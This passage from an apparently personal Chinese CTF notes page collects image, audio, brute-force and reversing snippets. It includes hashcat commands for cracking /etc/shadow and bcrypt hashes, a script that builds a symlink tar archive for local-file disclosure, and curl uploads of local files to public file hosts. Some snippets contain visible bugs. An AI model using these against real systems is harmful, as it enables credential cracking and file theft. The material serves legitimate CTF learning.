Loop through each pixel in the shares and combine them</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (width) :<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (height):<br>        pixell = sharel.getpixel((x, y))<br>        pixel2 = share2.getpixel((x, y))<br>        <span class="hljs-comment"># If both pixels are black, set the result pixel to black</span><br>        <span class="hljs-keyword">if</span> pixell == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> pixel2 == <span class="hljs-number">0</span>:<br>            result.putpixel((x, y), <span class="hljs-number">0</span>)<br>        <span class="hljs-comment"># Otherwise, set the result pixel to white</span><br>        <span class="hljs-keyword">else</span>:<br>            result.putpixel((x, y), <span class="hljs-number">255</span>)<br><span class="hljs-comment"># Save the resulting image</span><br>result.save(<span class="hljs-string">&quot;result.png&quot;</span>)<br></code></pre></td></tr></table></figure>

<h2 id="perlin-noise图片生成-对比脚本"><a href="#perlin-noise图片生成-对比脚本" class="headerlink" title="perlin noise图片生成+对比脚本"></a><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Perlin_noise">perlin noise</a>图片生成+对比脚本</h2><p>使用python模块<a target="_blank" rel="noopener" href="https://github.com/caseman/noise">noise</a>用perlin noise生成一张图片后对比另一张由perlin noise生成的图片，并把像素不同的地方标为黑色后写为结果图片。改一下也能用作两张普通图片的对比脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> noise<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-comment"># Set the seed for the Perlin noise generator</span><br>seed = <span class="hljs-number">2151</span><br><span class="hljs-comment"># Set the size of the image</span><br>width = <span class="hljs-number">1920</span><br>height = <span class="hljs-number">1080</span><br><span class="hljs-comment"># Set the scale of the Perlin noise</span><br>scale = <span class="hljs-number">100.0</span><br><span class="hljs-comment"># Create an empty NumPy array for the image</span><br>img_array = np.zeros((height, width))<br><span class="hljs-comment"># Loop through each pixel in the image and generate Perlin noise</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>        img_array[y, x] = noise.pnoise2(x/scale, y/scale, octaves=<span class="hljs-number">6</span>, persistence=<span class="hljs-number">0.5</span>, lacunarity=<span class="hljs-number">2.0</span>,repeatx=<span class="hljs-number">1024</span>, repeaty=<span class="hljs-number">1024</span>, base=seed)<br><span class="hljs-comment"># Create a PIL image from the NumPy array</span><br>img = Image.fromarray(np.uint8(img_array * <span class="hljs-number">255</span>))<br>img.save(<span class="hljs-string">&quot;res.png&quot;</span>)<br><span class="hljs-comment"># Load the modified image</span><br>mod_img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;compare.png’&#x27;</span>)<br><span class="hljs-comment"># Create a new black image for the changed pixels</span><br>new_img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (width, height), color=<span class="hljs-string">&#x27;black&#x27;</span>)<br><span class="hljs-comment"># Get the pixel access objects for the images</span><br>orig_pixels = img.load()<br>mod_pixels = mod_img.load()<br>new_pixels = new_img.load()<br><span class="hljs-comment"># Loop through the pixels and identify changed pixels</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        orig_pixel = orig_pixels[x, y]<br>        mod_pixel = mod_ pixels[x, y]<br>        <span class="hljs-keyword">if</span> orig_pixel != mod_pixel:<br>            <span class="hljs-comment"># Change the pixel in the new image to white</span><br>            new_pixels[x, y] = (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>)<br><span class="hljs-comment"># Save the new image with the changed pixels in white</span><br>new_img.save(<span class="hljs-string">&#x27;changed_pixels_flag.png&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h2 id="hashcat使用"><a href="#hashcat使用" class="headerlink" title="hashcat使用"></a><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4008">hashcat使用</a></h2><p>下载：在<a target="_blank" rel="noopener" href="https://hashcat.net/hashcat/">官网</a>下载hashcat binaries，然后用<code>7z x</code>解压文件即可(7zip下载：<code>sudo apt-get install p7zip-full</code>)。linux运行<code>hashcat.bin</code>,windows运行<code>hashcat.exe</code>。</p>
<p>今天又测试了一下这个方法，发现不行。然后发现可以直接用apt安装hashcat，但是安装后用hashcat命令也不行。最后发现用apt安装hashcat后之前下载的那个binary就能用了……</p>
<p>运行时指定hash模式的-m选项可以在<a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">这里</a>找到。例如爆破zip，先用<a target="_blank" rel="noopener" href="https://hashes.com/en/johntheripper/zip2john">zip2john</a>将zip转为hash，然后根据hash格式选择-m的参数。-a是爆破模式。</p>
<ul>
<li>掩码爆破：<code>./hashcat.bin -a 3 -m 13600 &#39;hash&#39; mask</code></li>
<li>字典爆破：<code>./hashcat.bin -a 0 -m 13600 &#39;hash&#39; dict</code></li>
</ul>
<p>字典爆破linux &#x2F;etc&#x2F;shadow的hash： <a target="_blank" rel="noopener" href="https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/">https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/</a></p>
<ul>
<li><code>hashcat -m 500 -a 0 -o cracked.txt hashes.txt ./rockyou.txt -O</code><br>其他爆破案例：</li>
<li><code>hashcat -m 3200 -a 0 dict.txt hash.txt</code>：爆破bcrypt hash</li>
<li><code>hashcat --potfile-disable -a 3 -m 500 hash.txt -d 1</code>:爆破linux <code>/etc/shadow</code>密码hash</li>
</ul>
<h2 id="Extracting-GPS-Coordinates-from-metadata"><a href="#Extracting-GPS-Coordinates-from-metadata" class="headerlink" title="Extracting GPS Coordinates from metadata"></a>Extracting GPS Coordinates from metadata</h2><p><a target="_blank" rel="noopener" href="https://github.com/BYU-CSA/BYUCTF-2023/tree/main/lost">https://github.com/BYU-CSA/BYUCTF-2023/tree/main/lost</a></p>
<h2 id="利用numba和multiprocessing库加速爆破"><a href="#利用numba和multiprocessing库加速爆破" class="headerlink" title="利用numba和multiprocessing库加速爆破"></a>利用<a target="_blank" rel="noopener" href="http://zhaoxuhui.top/blog/2019/01/17/PythonNumba.html">numba</a>和multiprocessing库加速爆破</h2><p>感觉任何任务量较大的爆破题都可以像这题的脚本一样，一个线程爆破一个部分，同时numba提高代码执行效率。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/TJCSec/tjctf-2023-challenges/tree/main/crypto/aluminum-isopropoxide">aluminum-isopropoxide</a></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> numba <span class="hljs-keyword">import</span> jit<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Pool<br><br><span class="hljs-meta">@jit(<span class="hljs-params">nopython=<span class="hljs-literal">True</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">idx</span>):<br>    f = <span class="hljs-string">b&#x27;l\x90C\x99e\x19\x03Br\x02\xd2\x98@\xf8\xe8deWOvv\x16[G&#125;GA\\\xd2rv`\x16\x18&#x27;</span><br><br>    <span class="hljs-keyword">for</span> key_ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(idx, idx + <span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span>):<br>        S_box = ...<br>        key_ = <span class="hljs-built_in">str</span>(key_)<br>        S = []<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">255</span>):<br>            S[i] = i<br>        j = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">255</span>):<br>            j = (j ^ S[i] ^ <span class="hljs-built_in">ord</span>(key_[i % <span class="hljs-built_in">len</span>(key_)])) % <span class="hljs-number">256</span><br>            S[i], S[j] = S[j], S[i]<br><br>        amount = <span class="hljs-built_in">len</span>(f)<br>        enc = f<br><br>        i = j = <span class="hljs-number">0</span><br>        ctr = <span class="hljs-number">0</span><br>        out = []<br>        <span class="hljs-keyword">while</span> ctr &lt; amount:<br>            i = (i * j) % <span class="hljs-number">256</span><br>            j = (i + S[j]) % <span class="hljs-number">256</span><br>            K = (S[i] &amp; S[j])<br>            out.append(enc[ctr] ^ S_box[K])<br>            ctr += <span class="hljs-number">1</span><br><br>        dec = <span class="hljs-string">&quot;&quot;</span>.join([<span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> out <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(i) <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234566789&#125;_&#123;&quot;</span>])<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(dec) == <span class="hljs-built_in">len</span>(f):<br>            <span class="hljs-built_in">print</span>(dec)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    idx = [<span class="hljs-number">0</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">2</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">3</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">4</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">5</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">6</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">7</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">8</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">9</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">10</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">11</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">12</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">13</span>,<span class="hljs-number">2</span>**<span class="hljs-number">31</span>//<span class="hljs-number">15</span> * <span class="hljs-number">14</span>]<br>    pool = Pool(<span class="hljs-number">15</span>)<br>    <span class="hljs-keyword">with</span> pool:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> pool.imap_unordered(main, idx):<br>            <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure>

<h2 id="python保存gif图片的每一帧"><a href="#python保存gif图片的每一帧" class="headerlink" title="python保存gif图片的每一帧"></a>python保存gif图片的每一帧</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, ImageSequence<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_frames</span>(<span class="hljs-params">image_path</span>):<br>    <span class="hljs-keyword">with</span> Image.<span class="hljs-built_in">open</span>(image_path) <span class="hljs-keyword">as</span> im:<br>        <span class="hljs-keyword">for</span> i, frame <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(ImageSequence.Iterator(im)):<br>            frame.save(<span class="hljs-string">f&#x27;frames/frame_<span class="hljs-subst">&#123;i&#125;</span>.png&#x27;</span>, <span class="hljs-string">&#x27;PNG&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h2 id="python-tarfile使用"><a href="#python-tarfile使用" class="headerlink" title="python tarfile使用"></a>python tarfile使用</h2><p>tar.extractall支持symbolic link，只检查文件的名称是不够的，服务端不做过滤就解压可能出现LFI</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exploit.tar.gz&#x27;</span>, <span class="hljs-string">&#x27;w:gz&#x27;</span>) <span class="hljs-keyword">as</span> tar:<br>    <span class="hljs-comment"># First file</span><br>    info1 = tarfile.TarInfo(<span class="hljs-string">&quot;test&quot;</span>)<br>    info1.<span class="hljs-built_in">type</span> = tarfile.SYMTYPE<br>    info1.linkname = <span class="hljs-string">&quot;/&quot;</span> <br>    tar.addfile(info1)<br>    <span class="hljs-comment"># Second file</span><br>    info2 = tarfile.TarInfo(<span class="hljs-string">&quot;./test/name&quot;</span>) <span class="hljs-comment">#若服务端指定不能以绝对路径/开头，可以这样绕过</span><br>    info2.<span class="hljs-built_in">type</span> = tarfile.SYMTYPE<br>    info2.linkname = <span class="hljs-string">&quot;linkname&quot;</span><br>    tar.addfile(info2)<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">The TarInfo class in the tarfile module is used to represent information about a file or directory in a tar archive. It provides attributes and methods to set and retrieve various properties of the file or directory.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Here are some key attributes of the TarInfo class:</span><br><span class="hljs-string"></span><br><span class="hljs-string">name: The name of the file or directory. This can be an absolute or relative path.</span><br><span class="hljs-string">size: The size of the file in bytes. For directories, this is set to 0.</span><br><span class="hljs-string">mtime: The modification time of the file or directory, represented as a Unix timestamp.</span><br><span class="hljs-string">type: The type of the file or directory. This can be one of the following constants defined in the tarfile module: tarfile.REGTYPE (regular file), tarfile.DIRTYPE (directory), tarfile.LNKTYPE (hard link), tarfile.SYMTYPE (symbolic link), tarfile.CHRTYPE (character special file), tarfile.BLKTYPE (block special file), tarfile.FIFOTYPE (FIFO special file), or tarfile.CONTTYPE (contiguous file).</span><br><span class="hljs-string">linkname: The target of a hard link or symbolic link.</span><br><span class="hljs-string">uid: The user ID of the owner of the file or directory.</span><br><span class="hljs-string">gid: The group ID of the owner of the file or directory.</span><br><span class="hljs-string">mode: The permissions of the file or directory, represented as an octal number.</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure>

<h2 id="描绘纯色背景GIF中的单一物品的轨迹"><a href="#描绘纯色背景GIF中的单一物品的轨迹" class="headerlink" title="描绘纯色背景GIF中的单一物品的轨迹"></a>描绘纯色背景GIF中的单一物品的轨迹</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/D13David/ctf-writeups/tree/main/tenablectf23/stego/ancient_scrawls">https://github.com/D13David/ctf-writeups/tree/main/tenablectf23/stego/ancient_scrawls</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/ITSEC-ASIA-ID/Competitions/tree/main/CTF/2023/TenableCTF/Steganography/Ancient%20Scrawls">https://github.com/ITSEC-ASIA-ID/Competitions/tree/main/CTF/2023/TenableCTF/Steganography/Ancient%20Scrawls</a></li>
</ul>
<h2 id="Mac-M1安装Ghidra"><a href="#Mac-M1安装Ghidra" class="headerlink" title="Mac M1安装Ghidra"></a>Mac M1安装Ghidra</h2><ol>
<li>去 <a target="_blank" rel="noopener" href="https://github.com/NationalSecurityAgency/ghidra">https://github.com/NationalSecurityAgency/ghidra</a> 下载最新版本ghidra</li>
<li>去 <a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/downloads/">https://www.oracle.com/java/technologies/downloads/</a> 下载要安装的ghidra版本的最低需求jdk</li>
<li>运行ghidraRun。若要求输入jdk路径，输入jdk安装路径&#x2F;Contents&#x2F;Home</li>
</ol>
<h2 id="C语言signal号表"><a href="#C语言signal号表" class="headerlink" title="C语言signal号表"></a>C语言signal号表</h2><p><a target="_blank" rel="noopener" href="https://www-uxsup.csx.cam.ac.uk/courses/moved.Building/signals.pdf">https://www-uxsup.csx.cam.ac.uk/courses/moved.Building/signals.pdf</a></p>
<h2 id="JS下载文件"><a href="#JS下载文件" class="headerlink" title="JS下载文件"></a>JS下载文件</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-params">ms</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));<br>&#125;<br><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">download</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">100</span>;i++)&#123;<br>        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">blob</span>())<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">blob</span> =&gt;</span> &#123;<br>            <span class="hljs-keyword">const</span> downloadLink = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br>            downloadLink.<span class="hljs-property">href</span> = <span class="hljs-variable constant_">URL</span>.<span class="hljs-title function_">createObjectURL</span>(blob);<br>            downloadLink.<span class="hljs-property">download</span> = <span class="hljs-string">&#x27;filename&#x27;</span>;<br>            downloadLink.<span class="hljs-title function_">click</span>();<br>        &#125;);<br>        <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">500</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="python获取wav文件频率"><a href="#python获取wav文件频率" class="headerlink" title="python获取wav文件频率"></a>python获取wav文件频率</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> scipy.io.wavfile <span class="hljs-keyword">as</span> wav<br>ans=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    sample_rate, audio_data = wav.read(<span class="hljs-string">&#x27;path&#x27;</span>)<br>    fft_data = np.fft.fft(audio_data)<br>    frequencies = np.fft.fftfreq(<span class="hljs-built_in">len</span>(fft_data), <span class="hljs-number">1</span>/sample_rate)<br>    positive_frequencies = frequencies[:<span class="hljs-built_in">len</span>(frequencies)//<span class="hljs-number">2</span>]<br>    magnitude_spectrum = np.<span class="hljs-built_in">abs</span>(fft_data[:<span class="hljs-built_in">len</span>(fft_data)//<span class="hljs-number">2</span>])<br>    max_index = np.argmax(magnitude_spectrum)<br>    max_frequency = positive_frequencies[max_index]<br>    ans.append(<span class="hljs-built_in">str</span>(max_frequency)[:-<span class="hljs-number">2</span>])<br><span class="hljs-built_in">print</span>(ans)<br></code></pre></td></tr></table></figure>

<h2 id="使用Filebin-api"><a href="#使用Filebin-api" class="headerlink" title="使用Filebin api"></a>使用Filebin api</h2><p>这样就能在linux终端上传文件了。去 <a target="_blank" rel="noopener" href="https://filebin.net/api">https://filebin.net/api</a> ，点击upload a file to a bin,点击Try it out，填写bin名（这个访问 <a target="_blank" rel="noopener" href="https://filebin.net/">https://filebin.net/</a> 就能得到一个名字）和上传的文件名。然后选择文件（随便一个即可），点击execute。如果成功，就可以copy curl命令到终端上。大概是这样：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl -X <span class="hljs-string">&#x27;POST&#x27;</span> \<br>  <span class="hljs-string">&#x27;https://filebin.net/binname/filename&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;accept: application/json&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Content-Type: application/octet-stream&#x27;</span> \<br>  --data-binary <span class="hljs-string">&#x27;@path/to/file&#x27;</span><br></code></pre></td></tr></table></figure>

<p>上传成功后get<code>https://filebin.net/binname/filename</code>即可。今天用的时候发现服务器满了传不了文件，我又找了另一个api通用的filebin： <a target="_blank" rel="noopener" href="https://arquivos-saude.recife.pe.gov.br/">https://arquivos-saude.recife.pe.gov.br/</a></p>
<p>今天发现两个好像都down了……找了个替代的： <a target="_blank" rel="noopener" href="https://www.file.io/">https://www.file.io/</a> 。这个的api稍微难用点，但是模板如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl -X <span class="hljs-string">&#x27;POST&#x27;</span> \<br>  <span class="hljs-string">&#x27;https://file.io/&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;accept: application/json&#x27;</span> \<br>  -H <span class="hljs-string">&#x27;Content-Type: multipart/form-data&#x27;</span> \<br>  -F <span class="hljs-string">&#x27;file=@path/to/file&#x27;</span> \<br>  -F <span class="hljs-string">&#x27;expires=ISO 8601 date string&#x27;</span> \<br>  -F <span class="hljs-string">&#x27;maxDownloads=1&#x27;</span> \<br>  -F <span class="hljs-string">&#x27;autoDelete=true&#x27;</span><br></code></pre></td></tr></table></figure>

<p>这个ISO 8601 date string可以在 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/toISOString">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/toISOString</a> 运行代码得到</p>
<h2 id="SMC文件解码"><a href="#SMC文件解码" class="headerlink" title="SMC文件解码"></a>SMC文件解码</h2><p>适用于简单的smc</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SMC&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    file=f.read()<br>offset= <span class="hljs-comment">#smc code出现的偏移</span><br>length= <span class="hljs-comment">#smc code段的长度</span><br>obfuscated=file[offset:offset+length]<br>res=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> obfuscated: <span class="hljs-comment">#这块为具体的解码逻辑，可以比这里更复杂</span><br>    res.append(i^<span class="hljs-number">0x66</span>)<br>res=<span class="hljs-built_in">bytes</span>(res)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/SMC_out&quot;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(file[:offset]+res+file[offset+length:]) <span class="hljs-comment">#重新拼接回去</span><br></code></pre></td></tr></table></figure>

<h2 id="python获取wav文件的频率"><a href="#python获取wav文件的频率" class="headerlink" title="python获取wav文件的频率"></a>python获取wav文件的频率</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/4n86rakam1/writeup/tree/main/SunshineCTF_2023/scripting/SimonProgrammer_3">SimonProgrammer 3</a></li>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/c0nrad/66a322ca0e1b0ffc4261e2a9ed6b1f93">https://gist.github.com/c0nrad/66a322ca0e1b0ffc4261e2a9ed6b1f93</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Amagnum/Music-notes-detection/blob/master/music_notes_detection.py">https://github.com/Amagnum/Music-notes-detection/blob/master/music_notes_detection.py</a></li>
</ul>
<h2 id="python恢复shifted-image"><a href="#python恢复shifted-image" class="headerlink" title="python恢复shifted image"></a>python恢复shifted image</h2><p>shifted image看起来倾斜，像是被拉伸了一样</p>
<p><a target="_blank" rel="noopener" href="https://berliangabriel.github.io/post/tcp1p-ctf-2023/">https://berliangabriel.github.io/post/tcp1p-ctf-2023/</a></p>
<h2 id="Git使用"><a href="#Git使用" class="headerlink" title="Git使用"></a>Git使用</h2><ul>
<li>如何设置commit时的username： <a target="_blank" rel="noopener" href="https://docs.github.com/en/get-started/getting-started-with-git/setting-your-username-in-git">https://docs.github.com/en/get-started/getting-started-with-git/setting-your-username-in-git</a> 。同理，设置邮箱可用<code>git config --global user.email &quot;email&quot;</code></li>
</ul>
<h2 id="如何将wav文件转为standard-IQ-file"><a href="#如何将wav文件转为standard-IQ-file" class="headerlink" title="如何将wav文件转为standard IQ file"></a>如何将wav文件转为standard IQ file</h2><p><a target="_blank" rel="noopener" href="https://blog.nanax.fr/post/2024-01-28-hardware-longrange2/">https://blog.nanax.fr/post/2024-01-28-hardware-longrange2/</a></p>
<h2 id="A-Block-and-a-Hard-Place"><a href="#A-Block-and-a-Hard-Place" class="headerlink" title="A Block and a Hard Place"></a><a target="_blank" rel="noopener" href="https://ctf.krauq.com/bi0sctf-2024">A Block and a Hard Place</a></h2><p>用户可以控制角色在有障碍的地图里走动，要求在事先不知道地图的情况下通过行走时的反馈描绘出地图</p>
